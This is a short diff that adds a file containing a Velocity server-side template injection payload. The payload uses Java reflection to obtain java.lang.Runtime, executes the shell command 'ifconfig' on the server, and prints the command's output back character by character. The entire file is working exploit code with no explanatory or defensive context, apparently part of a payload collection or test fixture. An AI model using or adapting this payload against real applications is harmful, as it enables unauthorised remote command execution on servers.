@@ -1,0 +1,6 @@
+#set ($exp = "")
+#set($ex=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ifconfig"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#set($chr=$exp.getClass().forName("java.lang.Character"))
+#foreach($i in [1..$out.available()])$exp.valueOf($chr.getDeclaredMethod("toChars",$chr.getDeclaredField("MIN_RADIX").getType()).invoke(null,$out.read()))#end
